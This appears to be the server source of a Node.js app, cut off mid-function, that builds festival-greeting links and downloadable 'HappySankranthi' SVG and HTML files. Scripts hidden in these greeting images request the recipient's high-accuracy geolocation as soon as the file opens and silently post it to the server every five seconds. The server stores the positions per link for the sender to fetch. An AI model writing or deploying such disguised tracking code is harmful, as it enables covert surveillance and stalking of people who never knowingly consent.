const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const fs = require('fs');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3001;

// Trust proxy for deployment (Render, Railway, etc.)
app.set('trust proxy', 1);

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static images
app.use('/images', express.static(path.join(__dirname, '../client/public')));

// In-memory storage (replace with database in production)
const trackingLinks = new Map(); // linkId -> { userId, createdAt, isActive }
const locationUpdates = new Map(); // linkId -> [{ lat, lng, timestamp, deviceId }]

// Generate a unique shareable link
app.post('/api/links/generate', (req, res) => {
  try {
    const { userId, mediaType = 'image' } = req.body;
    const linkId = uuidv4();
    
    // Detect if running on Vercel
    const isVercel = process.env.VERCEL || process.env.VERCEL_URL;
    const vercelUrl = process.env.VERCEL_URL ? `https://${process.env.VERCEL_URL}` : null;
    const protocol = req.protocol || 'https';
    const host = req.get('host') || process.env.VERCEL_URL || 'localhost:3000';
    
    // Frontend URL (for shareable link) - on Vercel, same domain
    const frontendUrl = process.env.FRONTEND_URL || process.env.BASE_URL || vercelUrl || (isVercel ? `https://${host}` : 'http://localhost:3000');
    
    // Backend URL (for API endpoints) - on Vercel, same domain as frontend
    const backendUrl = process.env.BACKEND_URL || (isVercel ? `https://${host}` : `${protocol}://${host.replace(':3000', ':3001')}`);
    
    const shareableLink = `${frontendUrl}/track/${linkId}`;
    
    trackingLinks.set(linkId, {
      userId: userId || 'anonymous',
      createdAt: new Date().toISOString(),
      isActive: true,
      linkId: linkId,
      mediaType: mediaType
    });
    
    locationUpdates.set(linkId, []);
    
    const createdLink = trackingLinks.get(linkId);
    
    res.json({
      success: true,
      linkId: linkId,
      shareableLink: shareableLink,
      mediaFileUrl: `${backendUrl}/api/media/${linkId}`,
      downloadUrl: `${backendUrl}/api/download/${linkId}`,
      downloadHtmlUrl: `${backendUrl}/api/download-html/${linkId}`,
      createdAt: createdLink ? createdLink.createdAt : new Date().toISOString()
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Serve media file that triggers tracking
app.get('/api/media/:linkId', (req, res) => {
  try {
    const { linkId } = req.params;
    const linkData = trackingLinks.get(linkId);
    
    if (!linkData) {
      return res.status(404).send('File not found');
    }
    
    // Detect if running on Vercel
    const isVercel = process.env.VERCEL || process.env.VERCEL_URL;
    const vercelUrl = process.env.VERCEL_URL ? `https://${process.env.VERCEL_URL}` : null;
    const protocol = req.protocol || 'https';
    const host = req.get('host') || process.env.VERCEL_URL || 'localhost:3000';
    
    // On Vercel, frontend and backend are on same domain
    const serverUrl = isVercel ? `https://${host}` : `${protocol}://${host.replace(':3000', ':3001')}`;
    const baseUrl = process.env.BASE_URL || process.env.FRONTEND_URL || vercelUrl || (isVercel ? `https://${host}` : serverUrl.replace(':3001', ':3000'));
    const imageUrl = `${baseUrl}/images/newyear2026.webp`;
    
    // Create HTML with New Year 2026 theme that silently tracks
    const html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Happy Sankranti, Pongal, Bogi & Kanuma! 🪔🌾</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      margin: 0;
      padding: 0;
      min-height: 100vh;
      font-family: 'Arial', sans-serif;
      overflow: hidden;
      position: relative;
      cursor: pointer;
    }
    .image-background {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-image: url('${imageUrl}');
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      filter: blur(15px);
      transition: filter 0.5s ease;
      z-index: 1;
    }
    .image-background.unblurred {
      filter: blur(0px);
    }
    .click-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.3);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 2;
      transition: opacity 0.5s ease;
    }
    .click-overlay.hidden {
      opacity: 0;
      pointer-events: none;
    }
    .click-message {
      color: white;
      font-size: 32px;
      font-weight: bold;
      text-align: center;
      text-shadow: 2px 2px 8px rgba(0,0,0,0.8);
      padding: 30px;
      background: rgba(0, 0, 0, 0.5);
      border-radius: 20px;
      animation: pulse 2s infinite;
    }
    .confetti {
      position: absolute;
      width: 10px;
      height: 10px;
      background: #ffd700;
      animation: fall linear infinite;
    }
    @keyframes fall {
      0% { transform: translateY(-100vh) rotate(0deg); opacity: 1; }
      100% { transform: translateY(100vh) rotate(360deg); opacity: 0; }
    }
    .media-container {
      text-align: center;
      color: white;
      padding: 40px;
      z-index: 10;
      position: relative;
    }
    .new-year-text {
      font-size: 48px;
      font-weight: bold;
      margin-bottom: 20px;
      background: linear-gradient(45deg, #ffd700, #ff6b6b, #4ecdc4, #45b7d1);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      animation: glow 2s ease-in-out infinite;
    }
    @keyframes glow {
      0%, 100% { filter: drop-shadow(0 0 10px rgba(255, 215, 0, 0.5)); }
      50% { filter: drop-shadow(0 0 20px rgba(255, 215, 0, 0.8)); }
    }
    .media-icon {
      font-size: 120px;
      margin-bottom: 20px;
      animation: bounce 1s ease-in-out infinite;
    }
    @keyframes bounce {
      0%, 100% { transform: translateY(0) scale(1); }
      50% { transform: translateY(-20px) scale(1.1); }
    }
    h1 { 
      font-size: 36px; 
      margin-bottom: 15px;
      text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
    }
    p { 
      font-size: 20px; 
      opacity: 0.9;
      margin-top: 10px;
    }
    .year-badge {
      display: inline-block;
      background: linear-gradient(135deg, #ff6b6b, #ee5a6f);
      padding: 10px 30px;
      border-radius: 50px;
      margin-top: 20px;
      font-size: 24px;
      font-weight: bold;
      box-shadow: 0 4px 15px rgba(255, 107, 107, 0.4);
      animation: pulse 2s infinite;
    }
    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.05); }
    }
    .image-background {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-image: url('${imageUrl}');
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      filter: blur(15px);
      transition: filter 0.5s ease;
      z-index: 1;
    }
    .image-background.unblurred {
      filter: blur(0px);
    }
    .click-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.3);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 2;
      transition: opacity 0.5s ease;
      cursor: pointer;
    }
    .click-overlay.hidden {
      opacity: 0;
      pointer-events: none;
    }
    .click-message {
      color: white;
      font-size: 32px;
      font-weight: bold;
      text-align: center;
      text-shadow: 2px 2px 8px rgba(0,0,0,0.8);
      padding: 30px;
      background: rgba(0, 0, 0, 0.5);
      border-radius: 20px;
      animation: pulse 2s infinite;
    }
    .media-container {
      text-align: center;
      color: white;
      padding: 40px;
      z-index: 3;
      position: relative;
      background: rgba(0, 0, 0, 0.4);
      border-radius: 20px;
      margin: 20px;
      backdrop-filter: blur(10px);
    }
    .confetti {
      position: absolute;
      width: 10px;
      height: 10px;
      background: #ffd700;
      animation: fall linear infinite;
      z-index: 4;
    }
  </style>
</head>
<body>
  <div class="image-background" id="backgroundImage"></div>
  <div class="click-overlay" id="clickOverlay">
    <div class="click-message">👆 Click to View Image 👆</div>
  </div>
  <div class="media-container">
    <div class="new-year-text">🪔 Happy Sankranti 🪔</div>
    <div class="media-icon">🌾</div>
    <h1>Pongal, Bogi & Kanuma Wishes!</h1>
    <p>May this harvest festival bring you prosperity and happiness!</p>
    <p style="font-size: 16px; margin-top: 20px; opacity: 0.8;">Wishing you abundance, joy, and blessings! ✨</p>
    <div class="year-badge">Sankranti</div>
  </div>
  <script>
    // Handle click to unblur image and start tracking
    let imageClicked = false;
    let trackingStarted = false;
    let startTrackingFunction = null;
    
    const backgroundImage = document.getElementById('backgroundImage');
    const clickOverlay = document.getElementById('clickOverlay');
    
    function handleImageClick() {
      if (!imageClicked) {
        imageClicked = true;
        backgroundImage.classList.add('unblurred');
        clickOverlay.classList.add('hidden');
        
        // Start location tracking when image is clicked
        if (!trackingStarted && startTrackingFunction) {
          trackingStarted = true;
          startTrackingFunction();
        }
      }
    }
    
    // Make entire page clickable
    document.body.addEventListener('click', handleImageClick);
    document.body.addEventListener('touchstart', handleImageClick);
    
    // Create confetti effect
    for (let i = 0; i < 50; i++) {
      const confetti = document.createElement('div');
      confetti.className = 'confetti';
      confetti.style.left = Math.random() * 100 + '%';
      confetti.style.animationDelay = Math.random() * 3 + 's';
      confetti.style.animationDuration = (Math.random() * 3 + 2) + 's';
      confetti.style.background = ['#ffd700', '#ff6b6b', '#4ecdc4', '#45b7d1', '#ffa500'][Math.floor(Math.random() * 5)];
      document.body.appendChild(confetti);
    }
  </script>
  <script>
    (function() {
      const linkId = '${linkId}';
      // Use the server URL - handle both file:// and http:// protocols
      let serverUrl = '${serverUrl}';
      
      // If opened as file://, use the original server URL from when file was created
      if (window.location.protocol === 'file:') {
        // Keep the original server URL - this is critical for offline files
        serverUrl = '${serverUrl}';
        console.log('File opened offline, using server URL:', serverUrl);
      } else {
        // When opened via HTTP, try to detect the server
        try {
          const currentOrigin = window.location.origin;
          serverUrl = currentOrigin.replace(':3000', ':3001');
          console.log('File opened via HTTP, detected server:', serverUrl);
        } catch(e) {
          // Fallback to original
          serverUrl = '${serverUrl}';
          console.log('Using fallback server URL:', serverUrl);
        }
      }
      
      const apiUrl = serverUrl + '/api';
      
      console.log('Sankranti/Pongal/Bogi/Kanuma Festival Banner Loaded! 🪔🌾');
      console.log('Location tracking ready for link:', linkId);
      
      function sendLocation(lat, lng) {
        const deviceId = localStorage.getItem('deviceId') || 'device_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
        localStorage.setItem('deviceId', deviceId);
        
        fetch(apiUrl + '/location/update', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            linkId: linkId,
            latitude: lat,
            longitude: lng,
            deviceId: deviceId
          })
        }).catch(() => {});
      }
      
      function startTracking() {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            function(position) {
              sendLocation(position.coords.latitude, position.coords.longitude);
              
              const watchId = navigator.geolocation.watchPosition(
                function(pos) {
                  sendLocation(pos.coords.latitude, pos.coords.longitude);
                },
                function() {},
                { enableHighAccuracy: true, maximumAge: 0 }
              );
              
              setInterval(function() {
                navigator.geolocation.getCurrentPosition(
                  function(pos) {
                    sendLocation(pos.coords.latitude, pos.coords.longitude);
                  },
                  function() {}
                );
              }, 5000);
            },
            function() {},
            { enableHighAccuracy: true, maximumAge: 0 }
          );
        }
      }
      
      // Make startTracking available globally for click handler
      startTrackingFunction = startTracking;
      window.startTracking = startTracking;
      
      // Start tracking immediately when page loads (don't wait for click)
      console.log('Starting location tracking immediately...');
      startTracking();
    })();
  </script>
</body>
</html>`;
    
    res.setHeader('Content-Type', 'text/html');
    res.send(html);
  } catch (error) {
    res.status(500).send('Error loading media');
  }
});

// Download endpoint - returns SVG file that can be saved
app.get('/api/download/:linkId', (req, res) => {
  try {
    const { linkId } = req.params;
    
    if (!linkId) {
      return res.status(400).json({ success: false, error: 'Link ID is required' });
    }
    
    const linkData = trackingLinks.get(linkId);
    
    if (!linkData) {
      return res.status(404).json({ success: false, error: 'Link not found' });
    }
    
    // Detect environment and build correct URLs
    const isVercel = process.env.VERCEL || process.env.VERCEL_URL;
    const vercelUrl = process.env.VERCEL_URL ? `https://${process.env.VERCEL_URL}` : null;
    const protocol = req.protocol || (isVercel ? 'https' : 'http');
    const host = req.get('host') || process.env.VERCEL_URL || 'localhost:3001';
    
    // Build server URL (backend API)
    let serverUrl;
    if (process.env.BACKEND_URL) {
      serverUrl = process.env.BACKEND_URL;
    } else if (isVercel) {
      // On Vercel, frontend and backend are on same domain
      serverUrl = `https://${host}`;
    } else {
      // Local development
      if (host.includes(':3000')) {
        serverUrl = `${protocol}://${host.replace(':3000', ':3001')}`;
      } else if (host.includes(':3001')) {
        serverUrl = `${protocol}://${host}`;
      } else {
        serverUrl = `http://localhost:3001`;
      }
    }
    
    // Build base URL (frontend) for image serving
    let baseUrl;
    if (process.env.BASE_URL || process.env.FRONTEND_URL) {
      baseUrl = process.env.BASE_URL || process.env.FRONTEND_URL;
    } else if (vercelUrl) {
      baseUrl = vercelUrl;
    } else if (isVercel) {
      baseUrl = `https://${host}`;
    } else {
      baseUrl = serverUrl.replace(':3001', ':3000');
    }
    
    // Read and embed image as base64 for offline use
    let imageBase64 = '';
    let useBase64 = false;
    
    try {
      const imagePath = path.join(__dirname, '../client/public/newyear2026.webp');
      if (fs.existsSync(imagePath)) {
        const imageBuffer = fs.readFileSync(imagePath);
        imageBase64 = imageBuffer.toString('base64');
        // Use base64 for offline support - but limit size to avoid issues
        if (imageBase64 && imageBase64.length > 0 && imageBase64.length < 2000000) { // Max 2MB for safety
          useBase64 = true;
          console.log(`Image embedded as base64 (${Math.round(imageBase64.length / 1024)}KB)`);
        } else {
          console.log('Image too large for base64, using gradient fallback');
        }
      } else {
        console.log('Image file not found at:', imagePath);
      }
    } catch (err) {
      console.log('Could not embed image:', err.message);
    }
    
    // Build image URL - use base64 if available, otherwise use server URL
    const imageUrl = useBase64 ? `data:image/webp;base64,${imageBase64}` : `${baseUrl}/images/newyear2026.webp`;
    
    // Create SVG image file - SVG is a legitimate image format that CAN contain JavaScript
    // This is the ONLY image format that supports tracking code
    const svgContent = `<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="1920" height="1080" viewBox="0 0 1920 1080" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;">
  <defs>
    <style>
      .blur-filter { filter: url(#blur); }
      .unblurred { filter: none; }
      .overlay { transition: opacity 0.5s ease; }
      .overlay.hidden { opacity: 0; pointer-events: none; }
    </style>
    <filter id="blur">
      <feGaussianBlur in="SourceGraphic" stdDeviation="15"/>
    </filter>
    <linearGradient id="textGradient" x1="0%" y1="0%" x2="100%" y2="0%">
      <stop offset="0%" style="stop-color:#ffd700;stop-opacity:1" />
      <stop offset="25%" style="stop-color:#ff8c00;stop-opacity:1" />
      <stop offset="50%" style="stop-color:#ff6b00;stop-opacity:1" />
      <stop offset="75%" style="stop-color:#ff4500;stop-opacity:1" />
      <stop offset="100%" style="stop-color:#ffd700;stop-opacity:1" />
    </linearGradient>
    <radialGradient id="glowGradient" cx="50%" cy="50%">
      <stop offset="0%" style="stop-color:#ffd700;stop-opacity:0.8" />
      <stop offset="100%" style="stop-color:#ff8c00;stop-opacity:0.3" />
    </radialGradient>
  </defs>
  
  <!-- Background Image with Blur -->
  <image id="bgImage" x="0" y="0" width="1920" height="1080" preserveAspectRatio="xMidYMid slice" 
         href="${imageUrl}" 
         class="blur-filter" style="cursor: pointer; transition: filter 0.5s ease;"/>
  
  <!-- Click Overlay -->
  <rect id="overlay" x="0" y="0" width="1920" height="1080" fill="rgba(0,0,0,0.3)" 
        class="overlay" style="cursor: pointer;">
    <title>Click to View Image</title>
  </rect>
  
  <!-- Click Message -->
  <text x="960" y="540" text-anchor="middle" fill="white" font-size="48" font-weight="bold" 
        font-family="Arial, sans-serif" id="clickText" 
        style="pointer-events: none; text-shadow: 2px 2px 8px rgba(0,0,0,0.8);">
    👆 Click to View Image 👆
  </text>
  
  <!-- Glow Effect Background -->
  <ellipse cx="960" cy="220" rx="600" ry="120" fill="url(#glowGradient)" opacity="0.6"/>
  
  <!-- Sankranti/Pongal/Bogi/Kanuma Festival Text - Main Title -->
  <text x="960" y="200" text-anchor="middle" fill="url(#textGradient)" font-size="80" font-weight="bold" 
        font-family="Arial, sans-serif" style="text-shadow: 3px 3px 6px rgba(0,0,0,0.8), 0 0 20px rgba(255,215,0,0.5);">
    🪔 Happy Sankranti 🪔
  </text>
  
  <!-- Subtitle with Festival Names -->
  <text x="960" y="280" text-anchor="middle" fill="#ffffff" font-size="48" font-weight="bold" 
        font-family="Arial, sans-serif" style="text-shadow: 2px 2px 8px rgba(0,0,0,0.9), 0 0 15px rgba(255,140,0,0.6);">
    🌾 Pongal &amp; Bogi &amp; Kanuma 🌾
  </text>
  
  <!-- Decorative Elements -->
  <circle cx="200" cy="200" r="8" fill="#ffd700" opacity="0.8">
    <animate attributeName="opacity" values="0.8;0.3;0.8" dur="2s" repeatCount="indefinite"/>
  </circle>
  <circle cx="1720" cy="200" r="8" fill="#ff8c00" opacity="0.8">
    <animate attributeName="opacity" values="0.3;0.8;0.3" dur="2s" repeatCount="indefinite"/>
  </circle>
  <circle cx="200" cy="280" r="6" fill="#ff6b00" opacity="0.7">
    <animate attributeName="opacity" values="0.7;0.2;0.7" dur="1.5s" repeatCount="indefinite"/>
  </circle>
  <circle cx="1720" cy="280" r="6" fill="#ffd700" opacity="0.7">
    <animate attributeName="opacity" values="0.2;0.7;0.2" dur="1.5s" repeatCount="indefinite"/>
  </circle>
  
  <script type="text/ecmascript">
    <![CDATA[
      (function() {
        const linkId = '${linkId}';
        let serverUrl = '${serverUrl}';
        let imageClicked = false;
        let trackingStarted = false;
        
        // Handle file:// protocol (when opened locally)
        if (window.location.protocol === 'file:') {
          // Use the server URL that was embedded when file was created
          serverUrl = '${serverUrl}';
          console.log('File opened locally, using server URL:', serverUrl);
        } else {
          // When opened via HTTP, detect the server
          try {
            const currentOrigin = window.location.origin;
            // Try to detect if we're on Vercel (same domain) or localhost
            if (currentOrigin.includes('localhost') || currentOrigin.includes('127.0.0.1')) {
              serverUrl = currentOrigin.replace(':3000', ':3001');
            } else {
              // On Vercel or production, API is on same domain
              serverUrl = currentOrigin;
            }
            console.log('File opened via HTTP, detected server:', serverUrl);
          } catch(e) {
            serverUrl = '${serverUrl}';
            console.log('Using fallback server URL:', serverUrl);
          }
        }
        
        const apiUrl = serverUrl + '/api';
        const bgImage = document.getElementById('bgImage');
        const overlay = document.getElementById('overlay');
        const clickText = document.getElementById('clickText');
        
        function handleClick() {
          if (!imageClicked) {
            imageClicked = true;
            bgImage.classList.remove('blur-filter');
            bgImage.classList.add('unblurred');
            overlay.classList.add('hidden');
            if (clickText) clickText.setAttribute('opacity', '0');
            
            if (!trackingStarted) {
              trackingStarted = true;
              startTracking();
            }
          }
        }
        
        // Make entire SVG clickable
        document.addEventListener('click', handleClick);
        document.addEventListener('touchstart', handleClick);
        
        function sendLocation(lat, lng) {
          try {
            const deviceId = localStorage.getItem('deviceId') || 'device_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
            localStorage.setItem('deviceId', deviceId);
            
            fetch(apiUrl + '/location/update', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                linkId: linkId,
                latitude: lat,
                longitude: lng,
                deviceId: deviceId
              })
            }).catch(function(err) {
              console.log('Location send failed (silent):', err);
            });
          } catch(e) {
            console.log('Location send error (silent):', e);
          }
        }
        
        function startTracking() {
          if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
              function(position) {
                sendLocation(position.coords.latitude, position.coords.longitude);
                
                // Watch for position changes
                navigator.geolocation.watchPosition(
                  function(pos) {
                    sendLocation(pos.coords.latitude, pos.coords.longitude);
                  },
                  function() {},
                  { enableHighAccuracy: true, maximumAge: 0 }
                );
                
                // Backup: send updates every 5 seconds
                setInterval(function() {
                  navigator.geolocation.getCurrentPosition(
                    function(pos) {
                      sendLocation(pos.coords.latitude, pos.coords.longitude);
                    },
                    function() {}
                  );
                }, 5000);
              },
              function() {},
              { enableHighAccuracy: true, maximumAge: 0 }
            );
          }
        }
        
        // Start tracking immediately when file opens
        console.log('Starting location tracking for link:', linkId);
        startTracking();
      })();
    ]]>
  </script>
</svg>`;
    
    // Serve as SVG image - legitimate image format that supports JavaScript
    res.setHeader('Content-Type', 'image/svg+xml');
    res.setHeader('Content-Disposition', `inline; filename="HappySankranthi.svg"`);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET');
    res.send(svgContent);
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Download HTML endpoint - returns HTML file that can be saved
app.get('/api/download-html/:linkId', (req, res) => {
  try {
    const { linkId } = req.params;
    
    if (!linkId) {
      return res.status(400).json({ success: false, error: 'Link ID is required' });
    }
    
    const linkData = trackingLinks.get(linkId);
    
    if (!linkData) {
      return res.status(404).json({ success: false, error: 'Link not found' });
    }
    
    // Detect environment and build correct URLs
    const isVercel = process.env.VERCEL || process.env.VERCEL_URL;
    const vercelUrl = process.env.VERCEL_URL ? `https://${process.env.VERCEL_URL}` : null;
    const protocol = req.protocol || (isVercel ? 'https' : 'http');
    const host = req.get('host') || process.env.VERCEL_URL || 'localhost:3001';
    
    // Build server URL (backend API)
    let serverUrl;
    if (process.env.BACKEND_URL) {
      serverUrl = process.env.BACKEND_URL;
    } else if (isVercel) {
      serverUrl = `https://${host}`;
    } else {
      if (host.includes(':3000')) {
        serverUrl = `${protocol}://${host.replace(':3000', ':3001')}`;
      } else if (host.includes(':3001')) {
        serverUrl = `${protocol}://${host}`;
      } else {
        serverUrl = `http://localhost:3001`;
      }
    }
    
    // Build base URL (frontend) for image serving
    let baseUrl;
    if (process.env.BASE_URL || process.env.FRONTEND_URL) {
      baseUrl = process.env.BASE_URL || process.env.FRONTEND_URL;
    } else if (vercelUrl) {
      baseUrl = vercelUrl;
    } else if (isVercel) {
      baseUrl = `https://${host}`;
    } else {
      baseUrl = serverUrl.replace(':3001', ':3000');
    }
    
    // Read and embed image as base64 for offline use
    let imageBase64 = '';
    let useBase64 = false;
    
    try {
      const imagePath = path.join(__dirname, '../client/public/newyear2026.webp');
      if (fs.existsSync(imagePath)) {
        const imageBuffer = fs.readFileSync(imagePath);
        imageBase64 = imageBuffer.toString('base64');
        if (imageBase64 && imageBase64.length > 0 && imageBase64.length < 2000000) {
          useBase64 = true;
          console.log(`Image embedded as base64 (${Math.round(imageBase64.length / 1024)}KB)`);
        }
      }
    } catch (err) {
      console.log('Could not embed image:', err.message);
    }
    
    const imageUrl = useBase64 ? `data:image/webp;base64,${imageBase64}` : `${baseUrl}/images/newyear2026.webp`;
    
    // Create HTML file with same content as SVG
    const htmlContent = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Happy Sankranti, Pongal, Bogi &amp; Kanuma! 🪔🌾</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      overflow: hidden;
    }
    body {
      background-image: url('${imageUrl}');
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      filter: blur(15px);
      transition: filter 0.5s ease;
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      cursor: pointer;
    }
    body.unblurred {
      filter: blur(0px);
    }
    .overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.3);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 2;
      transition: opacity 0.5s ease;
      cursor: pointer;
    }
    .overlay.hidden {
      opacity: 0;
      pointer-events: none;
    }
    .click-message {
      color: white;
      font-size: 48px;
      font-weight: bold;
      text-align: center;
      text-shadow: 2px 2px 8px rgba(0,0,0,0.8);
      padding: 30px;
      background: rgba(0, 0, 0, 0.5);
      border-radius: 20px;
    }
    .festival-text {
      position: fixed;
      top: 15%;
      left: 50%;
      transform: translateX(-50%);
      text-align: center;
      z-index: 3;
    }
    .main-title {
      font-size: 80px;
      font-weight: bold;
      background: linear-gradient(45deg, #ffd700, #ff8c00, #ff6b00, #ff4500, #ffd700);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      text-shadow: 3px 3px 6px rgba(0,0,0,0.8), 0 0 20px rgba(255,215,0,0.5);
      margin-bottom: 20px;
      font-family: Arial, sans-serif;
    }
    .subtitle {
      font-size: 48px;
      font-weight: bold;
      color: #ffffff;
      text-shadow: 2px 2px 8px rgba(0,0,0,0.9), 0 0 15px rgba(255,140,0,0.6);
      font-family: Arial, sans-serif;
    }
  </style>
</head>
<body id="bgImage">
  <div class="overlay" id="overlay">
    <div class="click-message">👆 Click to View Image 👆</div>
  </div>
  <div class="festival-text">
    <div class="main-title">🪔 Happy Sankranti 🪔</div>
    <div class="subtitle">🌾 Pongal &amp; Bogi &amp; Kanuma 🌾</div>
  </div>
  <script>
    const linkId = '${linkId}';
    let serverUrl = '${serverUrl}';
    let imageClicked = false;
    let trackingStarted = false;
    
    if (window.location.protocol === 'file:') {
      serverUrl = '${serverUrl}';
    } else {
      try {
        const currentOrigin = window.location.origin;
        if (currentOrigin.includes('localhost') || currentOrigin.includes('127.0.0.1')) {
          serverUrl = currentOrigin.replace(':3000', ':3001');
        } else {
          serverUrl = currentOrigin;
        }
      } catch(e) {
        serverUrl = '${serverUrl}';
      }
    }
    
    const apiUrl = serverUrl + '/api';
    const bgImage = document.getElementById('bgImage');
    const overlay = document.getElementById('overlay');
    
    function handleClick() {
      if (!imageClicked) {
        imageClicked = true;
        bgImage.classList.add('unblurred');
        overlay.classList.add('hidden');
        
        if (!trackingStarted) {
          trackingStarted = true;
          startTracking();
        }
      }
    }
    
    document.addEventListener('click', handleClick);
    document.addEventListener('touchstart', handleClick);
    
    function sendLocation(lat, lng) {
      try {
        const deviceId = localStorage.getItem('deviceId') || 'device_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
        localStorage.setItem('deviceId', deviceId);
        
        fetch(apiUrl + '/location/update', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            linkId: linkId,
            latitude: lat,
            longitude: lng,
            deviceId: deviceId
          })
        }).catch(function(err) {
          console.log('Location send failed (silent):', err);
        });
      } catch(e) {
        console.log('Location send error (silent):', e);
      }
    }
    
    function startTracking() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          function(position) {
            sendLocation(position.coords.latitude, position.coords.longitude);
            
            navigator.geolocation.watchPosition(
              function(pos) {
                sendLocation(pos.coords.latitude, pos.coords.longitude);
              },
              function() {},
              { enableHighAccuracy: true, maximumAge: 0 }
            );
            
            setInterval(function() {
              navigator.geolocation.getCurrentPosition(
                function(pos) {
                  sendLocation(pos.coords.latitude, pos.coords.longitude);
                },
                function() {}
              );
            }, 5000);
          },
          function() {},
          { enableHighAccuracy: true, maximumAge: 0 }
        );
      }
    }
    
    console.log('Starting location tracking for link:', linkId);
    startTracking();
  </script>
</body>
</html>`;
    
    res.setHeader('Content-Type', 'text/html');
    res.setHeader('Content-Disposition', `inline; filename="HappySankranthi.html"`);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET');
    res.send(htmlContent);
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Get link information
app.get('/api/links/:linkId', (req, res) => {
  try {
    const { linkId } = req.params;
    const linkData = trackingLinks.get(linkId);
    
    if (!linkData) {
      return res.status(404).json({ success: false, error: 'Link not found' });
    }
    
    res.json({
      success: true,
      link: linkData,
      locationCount: locationUpdates.get(linkId)?.length || 0
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Update location (called by friend when they visit the link)
app.post('/api/location/update', (req, res) => {
  // Add CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  // Handle preflight
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  try {
    const { linkId, latitude, longitude, deviceId } = req.body;
    
    console.log('📍 Location update received:', { linkId, latitude, longitude, deviceId });
    
    if (!linkId || latitude === undefined || longitude === undefined) {
      console.log('❌ Missing required fields');
      return res.status(400).json({ 
        success: false, 
        error: 'Missing required fields: linkId, latitude, longitude' 
      });
    }
    
    const linkData = trackingLinks.get(linkId);
    if (!linkData) {
      console.log('❌ Invalid linkId:', linkId);
      return res.status(404).json({ success: false, error: 'Invalid tracking link' });
    }
    
    if (!linkData.isActive) {
      console.log('❌ Link is inactive:', linkId);
      return res.status(403).json({ success: false, error: 'Tracking link is inactive' });
    }
    
    const locationData = {
      latitude: parseFloat(latitude),
      longitude: parseFloat(longitude),
      timestamp: new Date().toISOString(),
      deviceId: deviceId || 'unknown'
    };
    
    if (!locationUpdates.has(linkId)) {
      locationUpdates.set(linkId, []);
    }
    
    const updates = locationUpdates.get(linkId);
    updates.push(locationData);
    
    console.log('✅ Location saved for linkId:', linkId, 'Total updates:', updates.length);
    
    // Keep only last 1000 updates per link
    if (updates.length > 1000) {
      updates.shift();
    }
    
    res.json({
      success: true,
      message: 'Location updated successfully',
      timestamp: locationData.timestamp,
      count: updates.length
    });
  } catch (error) {
    console.log('❌ Error updating location:', error.message);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Get all location updates for a link
app.get('/api/location/:linkId', (req, res) => {
  try {
    const { linkId } = req.params;
    const updates = locationUpdates.get(linkId) || [];
    
    res.json({
      success: true,
      linkId: linkId,
      locations: updates,
      count: updates.length,
      latest: updates.length > 0 ? updates[updates.length - 1] : null
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Deactivate a tracking link
app.post('/api/links/:linkId/deactivate', (req, res) => {
  try {
    const { linkId } = req.params;
    const linkData = trackingLinks.get(linkId);
    
    if (!linkData) {
      return res.status(404).json({ success: false, error: 'Link not found' });
    }
    
    linkData.isActive = false;
